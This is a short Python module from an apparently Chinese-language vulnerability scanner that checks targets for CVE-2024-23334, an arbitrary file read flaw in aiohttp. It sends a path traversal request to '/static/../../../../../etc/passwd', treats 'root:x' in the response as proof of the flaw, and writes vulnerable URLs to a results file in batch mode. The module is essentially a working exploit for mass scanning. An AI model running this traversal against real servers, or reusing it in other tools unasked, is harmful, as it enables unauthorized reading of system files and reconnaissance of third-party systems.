#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()




class Cve_2024_23334:
    def get_url(self,input_url):
        try:
            url = input_url + "/static/../../../../../etc/passwd"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "root:x" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("AIOHTTP", '目标存在CVE-2024-23334任意文件读取漏洞')
                    OutPrintInfo("AIOHTTP", url)
                else:
                    OutPrintInfoSuc("AIOHTTP", f'目标存在CVE-2024-23334任意文件读取漏洞: {url}')
                    OutPutFile("aiohttp_2024_23334.txt",f'目标存在CVE-2024-23334任意文件读取漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("AIOHTTP", f'目标不存在CVE-2024-23334任意文件读取漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("AIOHTTP",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("AIOHTTP", '开始检测CVE-2024-23334任意文件读取漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("AIOHTTP", 'CVE-2024-23334任意文件读取漏洞检测结束')
